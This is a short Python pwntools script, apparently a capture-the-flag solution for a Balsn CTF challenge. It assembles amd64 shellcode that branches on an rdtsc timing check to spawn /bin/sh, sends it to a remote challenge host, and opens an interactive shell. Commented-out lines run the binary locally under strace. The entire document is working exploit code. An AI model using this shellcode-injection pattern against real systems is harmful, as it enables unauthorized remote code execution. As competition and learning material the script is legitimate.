#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
shellsource = \
    '    rdtsc\n' + \
    '    test rax, 0x100\n' + \
    '    lea rsp, [rest + rip]\n' + \
    '    jz exit0\n' + \
    shellcraft.amd64.linux.sh() + \
    'exit0:\n' + \
    shellcraft.amd64.linux.exit(0) + \
    '    .skip 512\n' + \
    'rest:\n'
print(shellsource)
shellcode = asm(shellsource)
p = remote('securecheck.balsnctf.com', 54321)
#p = process(['strace', '-f', 'release/nosyscall'])
#p = process('release/nosyscall')
p.send(shellcode)
p.interactive()
